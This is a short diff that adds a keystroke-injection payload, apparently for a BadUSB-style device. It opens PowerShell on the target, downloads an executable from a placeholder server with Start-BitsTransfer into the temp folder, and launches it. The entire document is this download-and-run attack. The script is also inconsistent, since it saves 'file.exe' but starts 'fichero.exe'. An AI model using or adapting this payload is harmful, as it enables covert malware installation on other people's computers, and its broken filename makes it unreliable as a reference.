@@ -1,0 +1,8 @@
+Delay 1000
+RunWin powershell
+Delay 3000
+PrintLine powershell Import-Module BitsTransfer;
+Delay 3000
+PrintLine Start-BitsTransfer -Source "http://server/file.exe" -Destination "%TEMP%\\file.exe";
+Delay 3000
+PrintLine Start-Process "%TEMP%\fichero.exe"
